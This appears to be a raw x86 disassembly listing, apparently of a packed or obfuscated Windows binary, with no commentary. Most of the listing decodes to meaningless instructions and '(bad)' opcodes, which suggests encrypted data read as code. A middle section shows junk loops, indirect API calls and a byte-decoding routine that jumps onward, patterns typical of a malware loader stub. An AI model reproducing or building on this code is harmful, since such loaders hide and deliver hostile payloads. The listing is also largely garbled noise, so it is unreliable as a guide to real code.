  410c38:	adc    dl,bl
  410c3a:	fistp  DWORD PTR [edx+0x15]
  410c3d:	sbb    esi,DWORD PTR [ebx+eax*2+0x7eb4d5dd]
  410c44:	cmp    al,0xb4
  410c46:	push   0xffffffc7
  410c48:	inc    ebp
  410c49:	fcom   QWORD PTR [edi+edx*8+0x61]
  410c4d:	sub    DWORD PTR [eax+0x3470dd82],0x43
  410c54:	mul    DWORD PTR [edi]
  410c56:	inc    eax
  410c57:	fs mov al,0xba
  410c5a:	data16 std 
  410c5c:	dec    ebp
  410c5d:	outs   dx,BYTE PTR ds:[esi]
  410c5e:	cmc    
  410c5f:	dec    edi
  410c60:	js     0x410c29
  410c62:	push   esp
  410c63:	clc    
  410c64:	jecxz  0x410ccb
  410c66:	les    eax,FWORD PTR [edx-0x1e10e6e7]
  410c6c:	and    al,0x84
  410c6e:	arpl   bx,cx
  410c70:	sbb    ecx,DWORD PTR [ebp-0x3bd57185]
  410c76:	in     al,0x8
  410c78:	sbb    dl,bh
  410c7a:	and    al,0x74
  410c7c:	cld    
  410c7d:	jo     0x410cf9
  410c7f:	xchg   esi,eax
  410c80:	dec    edx
  410c81:	(bad)  
  410c82:	push   ds
  410c83:	xor    DWORD PTR [ebp-0x5617bb03],esp
  410c89:	jle    0x410cf9
  410c8b:	repnz mov DWORD PTR [esi-0x25],eax
  410c8f:	cwde   
  410c90:	repz jp 0x410ce9
  410c93:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410c94:	adc    al,0x93
  410c96:	sub    ecx,DWORD PTR [ecx-0x2b9f8e2]
  410c9c:	jb     0x410ca5
  410c9e:	add    DWORD PTR [ebx+0x28],eax
  410ca1:	mov    eax,0xdba455e5
  410ca6:	sbb    dh,BYTE PTR [esp+ecx*1+0x2f]
  410caa:	mov    ah,0x22
  410cac:	arpl   WORD PTR [edi],bx
  410cae:	je     0x410d2a
  410cb0:	jg     0x410c49
  410cb2:	jmp    0x5758:0xcd0f7142
  410cb9:	popa   
  410cba:	cld    
  410cbb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410cbc:	mov    ebp,0xcdd8d2c8
  410cc2:	mov    edx,?
  410cc4:	sbb    al,0xf6
  410cc6:	aad    0x3d
  410cc8:	dec    edi
  410cc9:	bound  ecx,QWORD PTR [ebp+0x2b1af407]
  410ccf:	das    
  410cd0:	cli    
  410cd1:	inc    edx
  410cd2:	xchg   esi,eax
  410cd3:	js     0x410d22
  410cd5:	push   esi
  410cd6:	pop    ebx
  410cd7:	jg     0x410c88
  410cd9:	push   ebx
  410cda:	(bad)
  410cdf:	outs   dx,BYTE PTR ds:[esi]
  410ce0:	ja     0x410d21
  410ce2:	push   eax
  410ce3:	inc    edx
  410ce4:	loope  0x410ced
  410ce6:	sub    eax,0x894f3a7f
  410ceb:	or     esp,DWORD PTR [ebp+ecx*4-0x80]
  410cef:	xchg   edx,eax
  410cf0:	add    ebp,DWORD PTR [edi-0x876d49a]
  410cf6:	push   ebx
  410cf7:	rcr    BYTE PTR [edx+0x47e69ed3],cl
  410cfd:	je     0x410c9c
  410cff:	push   ecx
  410d00:	xchg   edx,eax
  410d01:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410d02:	xchg   ecx,eax
  410d03:	aam    0xfd
  410d05:	call   0x6dc51a78
  410d0a:	add    dl,cl
  410d0c:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  410d0e:	sub    BYTE PTR [ecx+0x4659d65b],dl
  410d14:	adc    eax,0xabcc7734
  410d19:	xchg   ebp,eax
  410d1a:	hlt    
  410d1b:	pop    eax
  410d1c:	jns    0x410d2e
  410d1e:	std    
  410d1f:	mov    esp,0xa2bdb9c8
  410d24:	enter  0x22bb,0xb4
  410d28:	lods   eax,DWORD PTR ds:[esi]
  410d29:	pop    esp
  410d2a:	(bad)  
  410d2b:	jbe    0x410d49
  410d2d:	retf   
  410d2e:	push   ds
  410d2f:	mov    edx,DWORD PTR [edx+0x271c5354]
  410d35:	pushf  
  410d36:	arpl   WORD PTR [ebx+0x7],si
  410d39:	gs mov dl,0xd
  410d3c:	mov    ah,0xd3
  410d3e:	cs jbe 0x410da0
  410d41:	push   0xffffffed
  410d43:	mov    WORD PTR ds:0xfc8ba488,fs
  410d49:	push   ecx
  410d4a:	cld    
  410d4b:	mov    ds:0xc37bf150,eax
  410d50:	in     al,0x2d
  410d52:	sti    
  410d53:	pop    es
  410d54:	adc    eax,0x87373a53
  410d59:	or     dh,BYTE PTR [edi-0x5dd08aa1]
  410d5f:	cmp    cl,BYTE PTR [ecx+ebp*4+0x34b025c3]
  410d66:	adc    bh,BYTE PTR [ecx]
  410d68:	jp     0x410de8
  410d6a:	xor    ecx,ecx
  410d6c:	cmp    DWORD PTR [ecx],edx
  410d6e:	sbb    al,bl
  410d70:	bound  ebp,QWORD PTR [ebp-0x4f]
  410d73:	pusha  
  410d74:	push   edi
  410d75:	jmp    0xeac1:0x35719187
  410d7c:	btc    DWORD PTR [esi-0x35],ecx
  410d80:	mov    ch,0xac
  410d82:	shl    DWORD PTR [ebp+0x16],1
  410d85:	push   ebp
  410d86:	pop    es
  410d87:	inc    esp
  410d88:	inc    eax
  410d89:	add    dh,BYTE PTR [edi-0x1e]
  410d8c:	mov    bl,0x79
  410d8e:	popf   
  410d8f:	ficom  DWORD PTR [esi+eax*1]
  410d92:	sub    edi,DWORD PTR [ebp+0x239508d5]
  410d98:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410d99:	push   0xffffffc5
  410d9b:	xor    eax,0xfebadc69
  410da0:	jns    0x410d7d
  410da2:	daa    
  410da3:	aam    0xb7
  410da5:	rcr    BYTE PTR [eax-0x63],0x20
  410da9:	dec    edi
  410daa:	mov    edx,0xf1dde3ab
  410daf:	xor    DWORD PTR [ebx-0x43fba6ad],edi
  410db5:	cmp    eax,0x36ef80f
  410dba:	ret    0x63e0
  410dbd:	jecxz  0x410e0a
  410dbf:	out    0x72,eax
  410dc1:	(bad)  
  410dc2:	xor    esi,ebx
  410dc4:	jne    0x410e0d
  410dc6:	inc    eax
  410dc7:	mov    ecx,0xc35ee7ca
  410dcc:	xchg   DWORD PTR [edx],eax
  410dce:	pop    ss
  410dcf:	call   0xe6fb4fb7
  410dd4:	dec    edi
  410dd5:	jo     0xd007e627
  410ddb:	sbb    ecx,edx
  410ddd:	pop    esi
  410dde:	and    BYTE PTR [ebx-0x6e05c3d4],ch
  410de4:	cwde   
  410de5:	mov    al,0xb6
  410de7:	add    al,0xbf
  410de9:	or     al,bl
  410deb:	call   0x4f58c75
  410df0:	jl     0x410e2b
  410df2:	repz retf 
  410df4:	aad    0x6c
  410df6:	dec    ebx
  410df7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410df8:	and    al,0x5f
  410dfa:	int3   
  410dfb:	sbb    DWORD PTR [edx],esi
  410dfd:	push   ebp
  410dfe:	in     al,dx
  410dff:	imul   ebp,DWORD PTR [eax-0x2b0cf2be],0xffffffb9
  410e06:	fwait
  410e07:	outs   dx,BYTE PTR ds:[esi]
  410e08:	fwait
  410e09:	inc    esp
  410e0a:	mov    eax,DWORD PTR [edx-0x18]
  410e0d:	mov    ds:0xae10c709,al
  410e12:	imul   esi,DWORD PTR [ecx],0x882491de
  410e18:	dec    esi
  410e19:	pop    edx
  410e1a:	fidivr WORD PTR [ebp+eax*1-0x39]
  410e1e:	and    edi,DWORD PTR [edi+0x52]
  410e21:	aam    0xb
  410e23:	addr16 icebp 
  410e25:	ret    0xebc
  410e28:	xor    bl,BYTE PTR ds:0x1b420616
  410e2e:	mov    ecx,0x4cb5a73c
  410e33:	sub    cl,dl
  410e35:	outs   dx,DWORD PTR ds:[esi]
  410e36:	ja     0x410e8e
  410e38:	push   eax
  410e39:	push   esp
  410e3a:	das    
  410e3b:	mov    bh,0x90
  410e3d:	cmp    DWORD PTR ds:0x29f63752,eax
  410e43:	je     0x410dce
  410e45:	(bad)  
  410e46:	mov    WORD PTR [ebx-0x28],?
  410e49:	add    dh,cl
  410e4b:	(bad)  
  410e4c:	repnz in eax,0xbb
  410e4f:	jecxz  0x410e3d
  410e51:	out    dx,eax
  410e52:	push   ds
  410e53:	scas   eax,DWORD PTR es:[edi]
  410e54:	dec    ebp
  410e55:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410e56:	call   0x91951049
  410e5b:	dec    edi
  410e5c:	stos   BYTE PTR es:[edi],al
  410e5d:	push   ss
  410e5e:	dec    esi
  410e5f:	pop    eax
  410e60:	dec    edi
  410e61:	aam    0x5b
  410e63:	loopne 0x410e54
  410e65:	ja     0x410e9c
  410e67:	pop    edx
  410e68:	aaa    
  410e69:	sbb    eax,0xf4ba0432
  410e6e:	add    BYTE PTR [ecx+0x55ad0d15],al
  410e74:	inc    ebx
  410e75:	dec    ecx
  410e76:	mov    ebp,es
  410e78:	fld    DWORD PTR [esi-0x6f]
  410e7b:	popf   
  410e7c:	in     eax,0x57
  410e7e:	int    0x9f
  410e80:	sbb    al,0xd0
  410e82:	xor    eax,0xdf833033
  410e87:	cmp    al,0x2e
  410e89:	repz mov ah,dl
  410e8c:	rcr    BYTE PTR [ebp-0x39fd76c1],0x88
  410e93:	push   eax
  410e94:	fwait
  410e95:	das    
  410e96:	dec    edx
  410e97:	div    edx
  410e99:	call   0xc3d9:0xa5938fe6
  410ea0:	shl    DWORD PTR [edx-0x80],1
  410ea3:	inc    ebp
  410ea4:	jecxz  0x410e68
  410ea6:	add    ecx,edx
  410ea8:	gs xchg edx,eax
  410eaa:	fdivr  QWORD PTR [edi+0x37]
  410ead:	sub    DWORD PTR [ebx],edi
  410eaf:	or     bh,bl
  410eb1:	xchg   ch,bh
  410eb3:	lods   al,BYTE PTR ds:[esi]
  410eb4:	push   ds
  410eb5:	xchg   edx,eax
  410eb6:	in     al,dx
  410eb7:	cmp    al,0x2b
  410eb9:	mov    ch,0xb1
  410ebb:	mov    eax,ds:0xd52ab198
  410ec0:	(bad)  
  410ec2:	mov    ds:0x40ea8ec4,al
  410ec7:	sub    bl,bl
  410ec9:	add    DWORD PTR [ebp-0x75],ebx
  410ecc:	xor    eax,0x5cab1f47
  410ed1:	in     eax,0x45
  410ed3:	fs mov eax,fs
  410ed6:	mov    edx,0xfb520855
  410edb:	aam    0x27
  410edd:	lahf   
  410ede:	xchg   DWORD PTR [eax+0x541b8872],eax
  410ee4:	jno    0x410ed2
  410ee6:	arpl   WORD PTR [ebx+0x1f],si
  410ee9:	push   ebx
  410eea:	add    edx,DWORD PTR [esp+ecx*8+0x3b]
  410eee:	pop    ebx
  410eef:	std    
  410ef0:	inc    edi
  410ef1:	ins    DWORD PTR es:[edi],dx
  410ef2:	sbb    edi,DWORD PTR [edi]
  410ef4:	call   0x37ee:0xb336ec22
  410efb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410efc:	push   ebx
  410efd:	retf   0xa495
  410f00:	inc    eax
  410f01:	and    eax,0xcea29648
  410f06:	into   
  410f07:	ds push edx
  410f09:	mov    dh,0x8e
  410f0b:	push   eax
  410f0c:	clc    
  410f0d:	pop    edi
  410f0e:	jno    0x410ed7
  410f10:	adc    esi,DWORD PTR [eax-0x14]
  410f13:	and    edi,esp
  410f15:	and    DWORD PTR [eax+ecx*1+0x5eb021fd],eax
  410f1c:	repnz or ebx,DWORD PTR [esp+ecx*1-0x3bbdca37]
  410f24:	xor    esp,edx
  410f26:	lock jmp 0x5ed9e6df
  410f2c:	addr16 mov ecx,0x73b9d427
  410f32:	xor    eax,0x4e0d8d13
  410f37:	or     ah,BYTE PTR [ebx-0x4834b497]
  410f3d:	mov    cl,0x13
  410f3f:	sbb    DWORD PTR [esi+0x15],edx
  410f42:	call   0x8c54:0xdc82914a
  410f49:	push   0xffffffe2
  410f4b:	and    BYTE PTR [ebp-0x25ec79c7],ch
  410f51:	jl     0x410ef8
  410f53:	(bad)  
  410f54:	aaa    
  410f55:	scas   al,BYTE PTR es:[edi]
  410f56:	xor    eax,0x279d1cf1
  410f5b:	sbb    eax,0x710d5a9b
  410f60:	aam    0x64
  410f62:	jnp    0x410f9f
  410f64:	inc    edx
  410f65:	or     eax,DWORD PTR [ebp+0x2cbada93]
  410f6b:	rol    DWORD PTR [esi],0x2e
  410f6e:	mov    ebp,0x62c2e626
  410f73:	jno    0x410f84
  410f75:	adc    esi,DWORD PTR [edx-0x3b]
  410f78:	inc    ebp
  410f79:	cmp    edx,esp
  410f7b:	cdq    
  410f7c:	jo     0x410f58
  410f7e:	inc    ebx
  410f7f:	idiv   bh
  410f81:	sub    dh,BYTE PTR [edx+eax*8+0xf]
  410f85:	xlat   BYTE PTR ds:[ebx]
  410f86:	cmp    ebp,DWORD PTR [edx-0x11453e29]
  410f8c:	sbb    BYTE PTR [eax],ch
  410f8e:	scas   al,BYTE PTR es:[edi]
  410f8f:	pop    ebx
  410f90:	lds    eax,FWORD PTR [ebp-0x4e078d6f]
  410f96:	call   0x5ed612bf
  410f9b:	inc    edi
  410f9c:	or     eax,0x4d9ad09b
  410fa1:	cwde   
  410fa2:	in     eax,dx
  410fa3:	push   ebx
  410fa4:	in     al,0xe7
  410fa6:	ret    
  410fa7:	sbb    eax,eax
  410fa9:	sub    ch,ch
  410fab:	jns    0x410f4b
  410fad:	sahf   
  410fae:	push   ds
  410faf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410fb0:	sbb    esi,edx
  410fb2:	icebp  
  410fb3:	je     0x410fa1
  410fb5:	xchg   esi,eax
  410fb6:	pusha  
  410fb7:	retf   
  410fb8:	mov    ds:0x38a819d4,eax
  410fbd:	std    
  410fbe:	mov    edi,0x7b4b5511
  410fc3:	cdq    
  410fc4:	sbb    ah,BYTE PTR [ebp-0x61]
  410fc7:	ret    0xa958
  410fca:	inc    esi
  410fcb:	in     eax,0xcb
  410fcd:	mov    ds:0xb4077e7e,eax
  410fd2:	mov    cs:0x757f5395,eax
  410fd8:	xor    BYTE PTR ds:0xa5c4c42a,ah
  410fde:	dec    esi
  410fdf:	mov    ecx,esp
  410fe1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410fe2:	pop    eax
  410fe3:	data16 out 0x7,al
  410fe6:	into   
  410fe7:	cld    
  410fe8:	enter  0x5e8b,0x24
  410fec:	push   esi
  410fed:	shl    BYTE PTR ds:0x73630fac,1
  410ff3:	pushf  
  410ff4:	add    DWORD PTR [esp+esi*1-0x55],esp
  410ff8:	std    
  410ff9:	clc    
  410ffa:	inc    eax
  410ffb:	outs   dx,DWORD PTR ds:[esi]
  410ffc:	cdq    
  410ffd:	xchg   ebx,edx
  410fff:	sub    al,0x63
  411001:	xchg   ecx,eax
  411002:	sbb    ch,BYTE PTR [edi-0x468c71c5]
  411008:	push   edx
  411009:	and    eax,0x571330fe
  41100e:	xor    eax,0xc2bb835
  411013:	mov    BYTE PTR [ebp+0x47],0xf6
  411017:	cld    
  411018:	stc    
  411019:	pop    esp
  41101a:	jmp    0x296b:0x3b1efc98
  411021:	out    0x74,eax
  411023:	dec    eax
  411024:	mov    ecx,DWORD PTR [ebp+0x8]
  411027:	mov    eax,0x8a8d
  41102c:	xor    ax,WORD PTR [ecx+0x20]
  411030:	adc    DWORD PTR ds:0x42b000,0x1520
  41103a:	mov    ecx,0x3b51
  41103f:	or     DWORD PTR ds:0x42a008,0x52f2
  411049:	add    ax,cx
  41104c:	or     DWORD PTR ds:0x42c010,ebx
  411052:	movzx  eax,ax
  411055:	mov    DWORD PTR [ebp-0x10],eax
  411058:	xor    DWORD PTR ds:0x429020,ecx
  41105e:	mov    BYTE PTR [ebp-0x1],0x7d
  411062:	lea    eax,[ebp-0x1]
  411065:	and    ecx,DWORD PTR ds:0x429024
  41106b:	mov    DWORD PTR [ebp-0xc],eax
  41106e:	mov    al,BYTE PTR [ebp-0x1]
  411071:	mov    ecx,DWORD PTR [ebp-0xc]
  411074:	xor    DWORD PTR ds:0x42d014,0x42a010
  41107e:	xor    al,0x74
  411080:	sub    al,0x8
  411082:	add    DWORD PTR ds:0x42901c,0x5bfc
  41108c:	mov    BYTE PTR [ecx],al
  41108e:	mov    DWORD PTR [ebp-0x18],0xf89c8585
  411095:	and    DWORD PTR ds:0x42d004,0x0
  41109f:	jmp    0x4110b3
  4110a4:	xor    ecx,ecx
  4110a6:	add    ecx,DWORD PTR ds:0x42d004
  4110ac:	inc    ecx
  4110ad:	mov    DWORD PTR ds:0x42d004,ecx
  4110b3:	cmp    DWORD PTR ds:0x42d004,0x1a
  4110ba:	jae    0x4110fe
  4110c0:	cmp    DWORD PTR ds:0x42d004,0x5
  4110c7:	jne    0x4110d3
  4110cd:	call   DWORD PTR ds:0x42e8f3
  4110d3:	cmp    DWORD PTR ds:0x42d004,0x4
  4110da:	jne    0x4110ef
  4110e0:	xor    ecx,ecx
  4110e2:	xor    ecx,DWORD PTR ds:0x42d004
  4110e8:	inc    ecx
  4110e9:	mov    DWORD PTR ds:0x42d004,ecx
  4110ef:	jmp    0x4110a4
  4110f4:	mov    DWORD PTR ds:0x42901c,0x6887
  4110fe:	push   ebx
  4110ff:	and    DWORD PTR ds:0x42c008,0x0
  411109:	jmp    0x411119
  41110e:	mov    eax,ds:0x42c008
  411113:	inc    eax
  411114:	mov    ds:0x42c008,eax
  411119:	cmp    DWORD PTR ds:0x42c008,0x19
  411120:	jae    0x4111a1
  411126:	cmp    DWORD PTR ds:0x42c008,0x5
  41112d:	jne    0x41113e
  411133:	push   0x42e000
  411138:	call   DWORD PTR ds:0x42e8f7
  41113e:	cmp    DWORD PTR ds:0x42c008,0x4
  411145:	jne    0x411156
  41114b:	mov    eax,ds:0x42c008
  411150:	inc    eax
  411151:	mov    ds:0x42c008,eax
  411156:	jmp    0x41110e
  41115b:	and    DWORD PTR ds:0x429024,0x0
  411165:	mov    ecx,DWORD PTR ds:0x429024
  41116b:	inc    ecx
  41116c:	mov    DWORD PTR ds:0x429024,ecx
  411172:	cmp    DWORD PTR ds:0x429024,0x21
  411179:	jne    0x411192
  41117f:	push   DWORD PTR [ebp-0x14]
  411182:	push   0x42d018
  411187:	push   0x6b2d
  41118c:	call   DWORD PTR ds:0x42e8bf
  411192:	cmp    DWORD PTR ds:0x429024,0x17
  411199:	jb     0x411165
  41119f:	xor    eax,eax
  4111a1:	mov    DWORD PTR [ebp-0x8],0xf89c8584
  4111a8:	and    DWORD PTR ds:0x42a008,0x0
  4111b2:	jmp    0x4111c5
  4111b7:	xor    eax,eax
  4111b9:	or     eax,DWORD PTR ds:0x42a008
  4111bf:	inc    eax
  4111c0:	mov    ds:0x42a008,eax
  4111c5:	cmp    DWORD PTR ds:0x42a008,0x14
  4111cc:	jae    0x41120d
  4111d2:	cmp    DWORD PTR ds:0x42a008,0x5
  4111d9:	jne    0x4111ea
  4111df:	push   0x42e067
  4111e4:	call   DWORD PTR ds:0x42e8fb
  4111ea:	cmp    DWORD PTR ds:0x42a008,0x4
  4111f1:	jne    0x411202
  4111f7:	mov    eax,ds:0x42a008
  4111fc:	inc    eax
  4111fd:	mov    ds:0x42a008,eax
  411202:	jmp    0x4111b7
  411207:	xor    DWORD PTR ds:0x42a018,edx
  41120d:	mov    ecx,DWORD PTR [ebp-0x18]
  411210:	dec    DWORD PTR ds:0x42a010
  411216:	push   esi
  411217:	mov    eax,0x751089b
  41121c:	mov    esi,DWORD PTR ds:0x41cda1
  411222:	mov    esi,DWORD PTR [esi]
  411224:	sub    DWORD PTR ds:0x429028,esi
  41122a:	xor    ecx,eax
  41122c:	inc    esi
  41122d:	mov    esi,0x3272e2
  411232:	add    DWORD PTR ds:0x42b008,0x42d010
  41123c:	push   edi
  41123d:	or     DWORD PTR ds:0x42b004,0x429028
  411247:	add    ecx,esi
  411249:	jmp    0x411277
  41124e:	mov    DWORD PTR ds:0x42c00c,0x285a
  411258:	mov    dl,BYTE PTR [ebp-0x1]
  41125b:	mov    DWORD PTR ds:0x42a00c,0x78fc
  411265:	mov    BYTE PTR [ebp+ecx*1-0x9c],dl
  41126c:	mov    DWORD PTR ds:0x429024,0x3f09
  411276:	inc    ecx
  411277:	mov    DWORD PTR ds:0x42a00c,0x5b6f
  411281:	cmp    ecx,0x40
  411284:	mov    DWORD PTR ds:0x42d01c,0x4c47
  41128e:	jb     0x41124e
  411294:	mov    edx,DWORD PTR [ebp-0x18]
  411297:	xor    edx,eax
  411299:	add    edx,esi
  41129b:	jmp    0x41130b
  4112a0:	sub    edi,ecx
  4112a2:	mov    edi,DWORD PTR [ebp+0x8]
  4112a5:	add    ecx,0x4f49
  4112ab:	mov    ecx,0x8a8d
  4112b0:	xor    cx,WORD PTR [edi+edx*4+0x2]
  4112b5:	sub    edi,DWORD PTR ds:0x42b00c
  4112bb:	mov    edi,0x3b51
  4112c0:	xor    DWORD PTR ds:0x42c01c,0x429014
  4112ca:	add    cx,di
  4112cd:	movzx  ecx,cx
  4112d0:	mov    DWORD PTR [ebp-0xc],ecx
  4112d3:	mov    ecx,DWORD PTR [ebp+0x8]
  4112d6:	sbb    DWORD PTR ds:0x42b000,0x42d008
  4112e0:	movzx  ecx,WORD PTR [ecx+edx*4]
  4112e4:	xor    ecx,0x8a8d
  4112ea:	adc    DWORD PTR ds:0x42b014,0x42b008
  4112f4:	add    ecx,edi
  4112f6:	mov    edi,DWORD PTR [ebp-0xc]
  4112f9:	mov    DWORD PTR ds:0x42b018,0x62b9
  411303:	mov    BYTE PTR [ebp+edi*1-0x9c],cl
  41130a:	inc    edx
  41130b:	mov    ecx,DWORD PTR [ebp-0x10]
  41130e:	mov    DWORD PTR ds:0x42a00c,0x6d31
  411318:	cmp    edx,ecx
  41131a:	mov    DWORD PTR ds:0x429018,0x5128
  411324:	jne    0x4112a0
  41132a:	mov    DWORD PTR ds:0x42c018,0x17
  411334:	cmp    DWORD PTR ds:0x42c018,0x0
  41133b:	je     0x411388
  411341:	cmp    DWORD PTR ds:0x42c018,0x8
  411348:	jne    0x411354
  41134e:	call   DWORD PTR ds:0x42e8ff
  411354:	cmp    DWORD PTR ds:0x42c018,0x9
  41135b:	jne    0x411370
  411361:	xor    edx,edx
  411363:	add    edx,DWORD PTR ds:0x42c018
  411369:	dec    edx
  41136a:	mov    DWORD PTR ds:0x42c018,edx
  411370:	mov    edx,DWORD PTR ds:0x42c018
  411376:	dec    edx
  411377:	mov    DWORD PTR ds:0x42c018,edx
  41137d:	jmp    0x411334
  411382:	adc    ecx,0x40c
  411388:	mov    ecx,DWORD PTR [ebp-0x18]
  41138b:	or     edi,edi
  41138d:	mov    edx,DWORD PTR [ebp+0x10]
  411390:	neg    edi
  411392:	xor    ecx,eax
  411394:	add    DWORD PTR ds:0x42b01c,ebx
  41139a:	add    ecx,esi
  41139c:	mov    DWORD PTR [edx],ecx
  41139e:	and    DWORD PTR ds:0x42b014,0x0
  4113a8:	mov    ecx,DWORD PTR ds:0x42b014
  4113ae:	inc    ecx
  4113af:	mov    DWORD PTR ds:0x42b014,ecx
  4113b5:	cmp    DWORD PTR ds:0x42b014,0x4
  4113bc:	jne    0x4113d5
  4113c2:	push   0x44ec
  4113c7:	push   0x42901c
  4113cc:	push   DWORD PTR [ebp-0x18]
  4113cf:	call   DWORD PTR ds:0x42e903
  4113d5:	cmp    DWORD PTR ds:0x42b014,0x3
  4113dc:	jne    0x4113ef
  4113e2:	mov    ecx,DWORD PTR ds:0x42b014
  4113e8:	inc    ecx
  4113e9:	mov    DWORD PTR ds:0x42b014,ecx
  4113ef:	cmp    DWORD PTR ds:0x42b014,0x13
  4113f6:	jb     0x4113a8
  4113fc:	or     edi,edi
  4113fe:	mov    ecx,DWORD PTR [ebp-0x18]
  411401:	xor    ecx,eax
  411403:	sbb    DWORD PTR ds:0x429004,0x2443
  41140d:	add    ecx,esi
  41140f:	mov    DWORD PTR [ebp-0xc],ecx
  411412:	mov    DWORD PTR [ebp+0x8],0xf89c8585
  411419:	mov    DWORD PTR ds:0x429014,0x17
  411423:	cmp    DWORD PTR ds:0x429014,0x0
  41142a:	je     0x411491
  411430:	cmp    DWORD PTR ds:0x429014,0xb
  411437:	jne    0x411450
  41143d:	push   0x0
  41143f:	push   DWORD PTR [ebp-0x1c]
  411442:	push   0x533d
  411447:	push   DWORD PTR [ebp-0x10]
  41144a:	call   DWORD PTR ds:0x42e8c3
  411450:	cmp    DWORD PTR ds:0x429014,0xc
  411457:	jne    0x41146c
  41145d:	xor    ecx,ecx
  41145f:	or     ecx,DWORD PTR ds:0x429014
  411465:	dec    ecx
  411466:	mov    DWORD PTR ds:0x429014,ecx
  41146c:	mov    ecx,DWORD PTR ds:0x429014
  411472:	dec    ecx
  411473:	mov    DWORD PTR ds:0x429014,ecx
  411479:	jmp    0x411423
  41147e:	xor    edi,edi
  411480:	xor    edi,DWORD PTR ds:0x41cddc
  411486:	mov    ecx,DWORD PTR ds:0x41cd75
  41148c:	sub    ecx,edi
  41148e:	or     edi,DWORD PTR [edi+ecx*1]
  411491:	mov    DWORD PTR [ebp-0x14],0xf89c85b5
  411498:	mov    DWORD PTR [ebp-0x10],0xf89c9585
  41149f:	and    DWORD PTR ds:0x42d00c,0x0
  4114a9:	mov    ecx,DWORD PTR ds:0x42d00c
  4114af:	inc    ecx
  4114b0:	mov    DWORD PTR ds:0x42d00c,ecx
  4114b6:	cmp    DWORD PTR ds:0x42d00c,0x10
  4114bd:	jne    0x4114d5
  4114c3:	push   DWORD PTR [ebp-0xc]
  4114c6:	push   DWORD PTR [ebp-0x1c]
  4114c9:	push   DWORD PTR [ebp-0xc]
  4114cc:	push   DWORD PTR [ebp-0x10]
  4114cf:	call   DWORD PTR ds:0x42e8c7
  4114d5:	cmp    DWORD PTR ds:0x42d00c,0xf
  4114dc:	jne    0x4114ef
  4114e2:	mov    ecx,DWORD PTR ds:0x42d00c
  4114e8:	inc    ecx
  4114e9:	mov    DWORD PTR ds:0x42d00c,ecx
  4114ef:	cmp    DWORD PTR ds:0x42d00c,0x1c
  4114f6:	jb     0x4114a9
  4114fc:	mov    ecx,DWORD PTR [ebp-0x14]
  4114ff:	mov    DWORD PTR [ebp+0x8],ecx
  411502:	mov    ecx,DWORD PTR [ebp+0x8]
  411505:	mov    DWORD PTR ds:0x42d008,0x14
  41150f:	cmp    DWORD PTR ds:0x42d008,0x0
  411516:	je     0x411548
  41151c:	cmp    DWORD PTR ds:0x42d008,0x16
  411523:	jne    0x411534
  411529:	push   0x7bbf
  41152e:	call   DWORD PTR ds:0x42e8cb
  411534:	xor    edi,edi
  411536:	add    edi,DWORD PTR ds:0x42d008
  41153c:	dec    edi
  41153d:	mov    DWORD PTR ds:0x42d008,edi
  411543:	jmp    0x41150f
  411548:	xor    ecx,eax
  41154a:	movzx  edi,BYTE PTR ds:0x429004
  411551:	sub    edi,DWORD PTR ds:0x429014
  411557:	mov    DWORD PTR ds:0x429004,edi
  41155d:	add    ecx,esi
  41155f:	mov    DWORD PTR ds:0x42c008,0x216c
  411569:	mov    ecx,0x242ebe9
  41156e:	mov    edi,0x5a28
  411573:	mov    edi,0xf641bea
  411578:	je     0x41cc2e
  41157e:	or     DWORD PTR ds:0x42a018,0xc8d
  411588:	mov    edx,DWORD PTR [ebp+0x8]
  41158b:	mov    ebx,DWORD PTR [ebp-0x8]
  41158e:	and    DWORD PTR ds:0x42a008,0xb9b
  411598:	xor    edx,eax
  41159a:	jmp    0x4138e3
  41159f:	test   DWORD PTR [edx-0x500c52df],edx
  4115a5:	jno    0x411619
  4115a7:	(bad)  
  4115a8:	cmc    
  4115a9:	jo     0x41159c
  4115ab:	jns    0x411537
  4115ad:	nop
  4115ae:	mov    bl,0x40
  4115b0:	scas   eax,DWORD PTR es:[edi]
  4115b1:	jl     0x41162f
  4115b3:	inc    eax
  4115b4:	pop    edi
  4115b5:	jl     0x411633
  4115b7:	cmp    eax,0x51e179b6
  4115bc:	xlat   BYTE PTR ds:[ebx]
  4115bd:	jg     0x41156b
  4115bf:	cs mov ebx,0x91fd4f0a
  4115c5:	hlt    
  4115c6:	cld    
  4115c7:	cmp    al,0x6e
  4115c9:	cmp    BYTE PTR [edx+0x7909d48f],ah
  4115cf:	aas    
  4115d0:	test   al,ah
  4115d2:	mov    bl,0x9a
  4115d4:	test   esp,0x560d58a6
  4115da:	add    eax,0x563bb4a4
  4115df:	jne    0x4115b6
  4115e1:	push   ebx
  4115e2:	xor    DWORD PTR [edi],ebp
  4115e4:	into   
  4115e5:	aas    
  4115e6:	mov    eax,ds:0x93a7e1e8
  4115eb:	fidiv  WORD PTR [edi]
  4115ed:	(bad)  
  4115ee:	mov    eax,0x2724d1ff
  4115f3:	fstp   DWORD PTR [edi-0x182de056]
  4115f9:	data16 es into 
  4115fc:	ja     0x411672
  4115fe:	arpl   WORD PTR ds:0x9e1d03ea,cx
  411604:	aaa    
  411605:	pop    ebx
  411606:	inc    edx
  411607:	push   cs
  411608:	sub    ebx,DWORD PTR [edi+0x3c]
  41160b:	mov    bh,0xf
  41160d:	inc    ecx
  41160e:	pop    ebp
  41160f:	retf   0xf202
  411612:	(bad)  
  411613:	xchg   esi,eax
  411614:	sub    eax,0x57cdceab
  411619:	js     0x411643
  41161b:	cdq    
  41161c:	ror    DWORD PTR [eax+0x75c05371],cl
  411622:	gs (bad) 
  411624:	jo     0x411693
  411626:	out    dx,eax
  411627:	mov    DWORD PTR [edi],0x76a53533
  41162d:	add    DWORD PTR [edx+0x7a],esi
  411630:	daa    
  411631:	cmp    al,0x97
  411633:	rcl    DWORD PTR [ebp-0x3da28ed],0x64
  41163a:	sbb    ah,BYTE PTR [eax+0x1e]
  41163d:	dec    ecx
  41163e:	stos   DWORD PTR es:[edi],eax
  41163f:	sub    bh,dh
